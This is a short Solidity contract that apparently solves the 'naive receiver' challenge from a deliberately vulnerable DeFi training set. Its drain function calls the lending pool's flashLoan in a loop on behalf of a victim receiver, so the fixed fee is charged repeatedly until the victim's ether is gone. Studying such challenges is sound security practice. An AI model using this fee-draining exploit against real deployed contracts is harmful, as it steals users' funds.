pragma solidity ^0.8.0;

import "../naive-receiver/NaiveReceiverLenderPool.sol";

contract AttackNaiveReceiver {
    NaiveReceiverLenderPool private pool;

    constructor(NaiveReceiverLenderPool poolAddress) {
        pool = NaiveReceiverLenderPool(poolAddress);
    }

    function drain(address user) public {
        require(address(user).balance > 0, "Account already drained");

        uint fee = pool.fixedFee();

        while(address(user).balance >= fee) {
            pool.flashLoan(user, 0);
        }
    }

    receive () external payable {}
}
